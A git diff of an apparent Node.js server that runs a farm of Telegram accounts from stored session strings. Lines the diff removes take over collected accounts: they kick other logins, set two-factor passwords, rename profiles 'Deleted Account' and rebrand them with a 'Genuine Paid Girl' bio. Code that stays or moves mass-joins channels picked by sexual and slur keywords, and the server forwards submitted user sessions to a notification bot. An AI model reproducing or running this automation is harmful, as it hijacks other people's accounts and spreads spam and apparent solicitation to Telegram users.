@@ -126,27 +126,6 @@ try {
     });
   })
 
-  schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
-    checkBufferClients()
-    for (const value of userMap.values()) {
-      try {
-        const now = new Date();
-        if (now.getUTCDate() % 3 === 1) {
-          await fetchWithTimeout(`${value.url}leavechannels`);
-        }
-        joinchannels(value)
-      } catch (error) {
-        console.log("Some Error: ", error.code);
-      }
-    }
-    await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);
-  })
-
-
-  schedule.scheduleJob('test3', ' 25 8 * * * ', 'Asia/Kolkata', async () => {
-    await joinchannelForBufferClients();
-  })
-
   schedule.scheduleJob('test3', ' 25 0 * * * ', 'Asia/Kolkata', async () => {
     for (const value of userMap.values()) {
       await sleep(1000);
@@ -192,16 +171,6 @@ async function assure() {
   })
 }
 
-// async function createTempClient() {
-//   const db = await ChannelService.getInstance();
-//   const user = await db.getTempUser();
-//   console.log(user);
-//   console.log(await createClient(user.mobile, user.session))
-// }
-// setTimeout(async () => {
-//   await createTempClient()
-// }, 3000);
-
 app.use(cors());
 app.use(bodyParser.json());
 app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
@@ -220,14 +189,6 @@ app.get('/exitacc', async (req, res, next) => {
   next();
 }, async (req, res) => {
   //
-});
-
-app.get('/checkBufferClients', async (req, res, next) => {
-  checkerclass.getinstance()
-  res.send('Checking Buffer Clients');
-  next();
-}, async (req, res) => {
-  await checkBufferClients();
 });
 
 app.get('/processUsers/:limit/:skip', async (req, res, next) => {
@@ -289,36 +250,6 @@ app.post('/channels', async (req, res, next) => {
   })
 });
 
-let settingupClient = Date.now() - 250000;
-app.get('/setupClient/:clientId', async (req, res, next) => {
-  res.send('Hello World!');
-  next();
-}, async (req, res) => {
-  if (Date.now() > (settingupClient + 240000)) {
-    settingupClient = Date.now();
-    const clientId = req.params?.clientId;
-    const archieveOld = req?.query?.a;
-    console.log(clientId, archieveOld);
-    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false)
-  } else {
-    console.log("Profile Setup Recently tried");
-  }
-})
-
-app.get('/updateClient/:clientId', async (req, res, next) => {
-  res.send('Hello World!');
-  next();
-}, async (req, res) => {
-  if (Date.now() > (settingupClient + 240000)) {
-    settingupClient = Date.now();
-    const clientId = req.params?.clientId;
-    console.log(clientId);
-    await updateClient(clientId.toString())
-  } else {
-    console.log("Profile Setup Recently tried");
-  }
-})
-
 app.get('/getip', (req, res) => {
   res.json(ip);
 });
@@ -330,17 +261,8 @@ app.post('/users', async (req, res, next) => {
 }, async (req, res) => {
   const user = req.body;
   const db = ChannelService.getInstance();
-  const cli = getClient(user.mobile);
-  const activeClientSetup = getActiveClientSetup()
-  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
-    await db.insertUser(user);
-    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
-  } else {
-    setActiveClientSetup(undefined)
-    console.log("New Session Generated");
-    await setNewClient(user, activeClientSetup);
-    await deleteClient(user.mobile)
-  }
+  await db.insertUser(user);
+  await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
 });
 
 app.get('/channels/:limit/:skip', async (req, res, next) => {
@@ -599,6 +521,35 @@ app.get('/setactiveqr', async (req, res, next) => {
     await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);
   })
 });
+
+app.get('/joinchannel', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    if (userName) {
+      const data = userMap.get(userName.toLowerCase());
+      if (data) {
+        joinchannels(data)
+      } else {
+        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
+      }
+    } else {
+      Array.from(userMap.values()).map(async (value) => {
+        try {
+          joinchannels(value);
+          await sleep(3000);
+        } catch (error) {
+          console.log("Some Error: ", error.code);
+        }
+      })
+    }
+  } catch (error) {
+    console.log("Some Error: ", error);
+  }
+});
+
 
 app.get('/getUpiId', async (req, res) => {
   checkerclass.getinstance();
@@ -1216,6 +1167,21 @@ app.get('/receiveNumber/:num', async (req, res, next) => {
   }
 });
 
+app.get('/disconnectUser', async (req, res, next) => {
+  res.send('Hello World!');
+  next();
+}, async (req, res) => {
+  try {
+    const userName = req.query.userName;
+    const data = userMap.get(userName.toLowerCase());
+    if (data) {
+      await axios.get(`${data.url}exit`, { timeout: 7000 });
+    }
+  } catch (error) {
+    console.log("Some Error: ", error.code);
+  }
+});
+
 app.get('/tgclientoff/:num', async (req, res, next) => {
   res.send('Hello World!');
   next();
@@ -1261,45 +1227,6 @@ app.get('/receive', async (req, res, next) => {
     } else {
       console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
     }
-  } catch (error) {
-    console.log("Some Error: ", error.code);
-  }
-});
-
-
-app.get('/joinchannel', async (req, res, next) => {
-  res.send('Hello World!');
-  next();
-}, async (req, res) => {
-  try {
-    const userName = req.query.userName;
-    if (userName) {
-      const data = userMap.get(userName.toLowerCase());
-      if (data) {
-        joinchannels(data)
-      } else {
-        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
-      }
-    } else {
-      for (const value of userMap.values()) {
-        try {
-          joinchannels(value)
-        } catch (error) {
-          console.log("Some Error: ", error.code);
-        }
-      }
-    }
-  } catch (error) {
-    console.log("Some Error: ", error);
-  }
-});
-
-app.get('/joinchannelBf', async (req, res, next) => {
-  res.send('Hello World!');
-  next();
-}, async (req, res) => {
-  try {
-    joinchannelForBufferClients()
   } catch (error) {
     console.log("Some Error: ", error.code);
   }
@@ -1535,6 +1462,13 @@ class checkerclass {
         console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'ChatGPT', ` NOT Reachable`);
         await fetchWithTimeout(`${ppplbot()}&text=TgSignup  NOT Reachable`);
       }
+      try {
+        const resp = await axios.get(`https://tgcms.glitch.me/`, { timeout: 55000 });
+      }
+      catch (e) {
+        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'uptime2', ` NOT Reachable`);
+        await fetchWithTimeout(`${ppplbot()}&text=uptime2  NOT Reachable`);
+      }
     }, 60000);
 
     // setInterval(async () => {
@@ -1658,34 +1592,6 @@ async function createInitializedObject() {
   return initializedObject;
 }
 
-async function joinchannels(value) {
-  try {
-    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
-    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
-    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
-      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
-      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
-      const db = ChannelService.getInstance();
-      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
-      for (const channel of channels) {
-        try {
-          console.log(channel.username);
-          const username = channel?.username?.replace("@", '');
-          if (username) {
-            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);
-            await sleep(180000);
-          }
-        } catch (error) {
-          console.log("Some Error: ", error)
-        }
-      }
-    }
-  } catch (error) {
-    console.log(error)
-  }
-}
-
-
 async function getPromotionStatsPlain() {
   let resp = '';
   const db = ChannelService.getInstance();
@@ -1711,14 +1617,6 @@ async function getPromotionStatsHtml() {
   resp = resp + await getPromotionStats();
   resp += '</pre></body></html>';
   return resp;
-}
-
-function isDateInPast(dateStr) {
-  const today = new Date();
-  const [day, month, year] = dateStr.split('-').map(Number);
-  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript
-
-  return inputDate < today;
 }
 
 async function getData() {
@@ -1781,295 +1679,40 @@ async function getData() {
       </div>
     </div>`
   );
-
 }
-let goodIds = [];
-let badIds = [];
-async function checkBufferClients() {
-  const db = await ChannelService.getInstance();
-  await disconnectAll()
-  await sleep(2000);
-  const clients = await db.readBufferClients({});
-  goodIds = [];
-  badIds = [];
-  if (clients.length < 40) {
-    for (let i = 0; i < 40 - clients.length; i++) {
-      badIds.push(1)
-    }
-  }
-  for (const document of clients) {
-    console.log(document)
-    const cli = await createClient(document.mobile, document.session);
-    if (cli) {
-      const client = await getClient(document.mobile);
-      const hasPassword = await client.hasPassword();
-      if (!hasPassword) {
-        badIds.push(document.mobile);
-        await db.deleteBufferClient(document);
-      } else {
-        const channels = await client.channelInfo(true);
-        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });
-        console.log(document.mobile, " :  ALL Good");
-        goodIds.push(document.mobile)
-      }
-      await client.disconnect();
-      await deleteClient(document.mobile)
-      await sleep(2000);
-    } else {
-      console.log(document.mobile, " :  false");
-      badIds.push(document.mobile);
-      await db.deleteBufferClient(document)
-      await db.deleteUser(document);
-    }
-  }
-  console.log(badIds, goodIds);
-  await addNewUserstoBufferClients();
-}
-
-async function addNewUserstoBufferClients() {
-  const db = await ChannelService.getInstance();
-  const cursor = await db.getNewBufferClients(goodIds);
-  while (badIds.length > 0) {
-    try {
-      if (cursor.hasNext()) {
-        const document = await cursor.next();
-        const cli = await createClient(document.mobile, document.session);
-        if (cli) {
-          const client = await getClient(document.mobile);
-          const hasPassword = await client.hasPassword();
-          console.log("hasPassword: ", hasPassword);
-          if (!hasPassword) {
-            await client.removeOtherAuths();
-            await client.set2fa();
-            console.log("waiting for setting 2FA");
-            await sleep(35000);
-            await client.updateUsername();
-            await sleep(5000)
-            await client.updatePrivacyforDeletedAccount();
-            await sleep(5000)
-            await client.updateProfile("Deleted Account", "Deleted Account");
-            await sleep(5000)
-            await client.deleteProfilePhotos();
-            await sleep(5000)
-            console.log("Inserting Document");
-            await db.insertInBufferClients(document);
-            await client.disconnect();
-            await deleteClient(document.mobile)
-            badIds.pop();
-          } else {
-            await db.updateUser(document, { twoFA: true });
-            await client.disconnect();
-            await deleteClient(document.mobile)
-          }
-        } else {
-          await db.deleteUser(document);
-        }
-      } else {
-        console.log("Cursor Does not have Next");
-      }
-    } catch (error) {
-      console.error("An error occurred:", error);
-    }
-  }
-  setTimeout(() => {
-    joinchannelForBufferClients()
-  }, 2 * 60 * 1000);
-}
-
-
-async function updateClient(clientId) {
-  try {
-    const db = await ChannelService.getInstance();
-    const oldClient = await db.getUserConfig({ clientId })
-    if (oldClient) {
-      try {
-        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
-        if (oldClientUser) {
-          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);
-          if (cli) {
-            const client = await getClient(oldClientUser.mobile);
-            const username = (clientId.match(/[a-zA-Z]+/g)).toString();
-            await CloudinaryService.getInstance(username);
-            const userCaps = username[0].toUpperCase() + username.slice(1)
-            await client.updateUsername(`${userCaps}Redd`);
-            await sleep(5000)
-            await client.deleteProfilePhotos();
-            await sleep(3000)
-            await client.updatePrivacy();
-            await sleep(3000)
-            await client.updateProfilePic('./dp1.jpg');
-            await sleep(1000);
-            await client.updateProfilePic('./dp2.jpg');
-            await sleep(1000);
-            await client.updateProfilePic('./dp3.jpg');
-            await sleep(1000);
-            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
-          }
-        }
-      } catch (error) {
-        console.log("Error updateing settings of old Client - ", error);
-      }
-    }
-  } catch (e) {
-
-  }
-}
-async function setUpClient(clientId, archieveOld) {
-  try {
-    const db = await ChannelService.getInstance();
-    const oldClient = await db.getUserConfig({ clientId })
-    let oldClienttg;
-    if (archieveOld && oldClient) {
-      try {
-        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
-        if (oldClientUser) {
-          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session, false);
-          if (cli) {
-            oldClienttg = await getClient(oldClientUser.mobile);
-            // await oldClienttg.updateProfile("Deleted Account", `New ACC https://${oldClient.link}`);
-            // await sleep(5000)
-            await oldClienttg.deleteProfilePhotos();
-            await sleep(5000)
-            await oldClienttg.updatePrivacyforDeletedAccount();
-          }
-        }
-        delete oldClientUser["_id"]
-        await db.insertInBufferClients({ ...oldClientUser })
-      } catch (error) {
-        console.log("Error updateing settings of old Client - ", error);
-      }
-      delete oldClient['_id']
-      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]
-      await db.insertInAchivedClient(oldClient);
-      console.log("Archived old client");
-    }
-
-    const newClient = await db.getOneBufferClient();
-    await deleteClient(newClient.mobile)
-    await sleep(2000);
-    if (newClient) {
-      const cli = await createClient(newClient.mobile, newClient.session, false);
-      if (cli) {
-        const client = await getClient(newClient.mobile);
-        const username = (clientId.match(/[a-zA-Z]+/g)).toString();
-        await CloudinaryService.getInstance(username);
-        const userCaps = username[0].toUpperCase() + username.slice(1);
-        setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });
-        const newUsername = await client.updateUsername(`${userCaps}Redd`);
-        oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
-        await sleep(3000)
-        await client.deleteProfilePhotos();
-        await sleep(3000)
-        await client.updatePrivacy();
-        await sleep(3000)
-        await client.updateProfilePic('./dp1.jpg');
-        await sleep(1000);
-        await client.updateProfilePic('./dp2.jpg');
-        await sleep(1000);
-        await client.updateProfilePic('./dp3.jpg');
-        await sleep(1000);
-        await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
-        await sleep(3000)
-        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });
-        if (existingData) {
-          await setNewClient(existingData, clientId);
-        } else {
-          await generateNewSession(newClient.mobile)
-        }
-      }
-    }
-  } catch (error) {
-    console.log(error)
-  }
-}
-async function generateNewSession(phoneNumber) {
-  try {
-    console.log("String Generation started");
-    await sleep(2000);
-    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${phoneNumber}`);
-    console.log("Code Sent successfully")
-  } catch (error) {
-    console.log(error)
-  }
-}
-async function setNewClient(user, activeClientSetup) {
-  try {
-    const db = await ChannelService.getInstance();
-    let mainAccount = user.userName?.replace("@", '')
-    if (fetchNumbersFromString(activeClientSetup.clientId) == "2") {
-      const mainUser = await db.getUserConfig({ clientId: activeClientSetup.clientId.replace("2", "1") });
-      mainAccount = mainUser.userName;
-    } else {
-      const client2 = activeClientSetup.clientId.replace("1", "2")
-      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });
-      if (data) {
-        console.log(client2, " -  ", data)
-        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
-        if (data.repl) {
-          try {
-            await axios.get(`${data?.repl}/exit`);
-          } catch (error) {
-
-          }
-        }
-      }
-    }
-    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
-    console.log("Updated the Client Successfully", updatedClient);
-    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
-    console.log(activeClientSetup.clientId, " -  ", updatedClient)
-    if (updatedClient?.repl) {
-      try {
-        await axios.get(`${updatedClient?.repl}/exit`)
-      } catch (error) {
-        console.log(error);
-      }
-    }
-    await setUserMap()
-  } catch (error) {
-    console.log(error);;
-  }
-}
-
-function fetchNumbersFromString(inputString) {
-  const regex = /\d+/g;
-  const matches = inputString.match(regex);
-  if (matches) {
-    const result = matches.join('');
-    return result;
-  } else {
-    return '';
-  }
-}
-
-async function joinchannelForBufferClients() {
-  const db = ChannelService.getInstance();
-  await disconnectAll();
-  await sleep(2000);
-  const clients = await db.readBufferClients({ channels: { "$lt": 150 } }, 3)
-  for (const document of clients) {
-    const cli = await createClient(document.mobile, document.session, false);
-    if (cli) {
-      const client = await getClient(document.mobile);
-      const channels = await client.channelInfo(true);
-      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
-      const result = await db.getActiveChannels(150, 0, keys, channels.ids, "channels");
-      console.log("DbChannelsLen: ", result.length);
-      let resp = '';
-      for (const channel of result) {
-
-        resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
-      }
-      client.joinChannels(resp);
-    }
-  }
-}
-
 function pushToconnectionQueue(userName, processId) {
   const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
   if (existingIndex !== -1) {
     connetionQueue[existingIndex].processId = processId;
   } else {
     connetionQueue.push({ userName, processId });
+  }
+}
+
+
+async function joinchannels(value) {
+  try {
+    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
+    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
+    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
+      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
+      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+      const db = ChannelService.getInstance();
+      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
+      for (const channel of channels) {
+        try {
+          console.log(channel.username);
+          const username = channel?.username?.replace("@", '');
+          if (username) {
+            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);
+            await sleep(200000);
+          }
+        } catch (error) {
+          console.log("Some Error: ", error)
+        }
+      }
+    }
+  } catch (error) {
+    console.log(error)
   }
 }
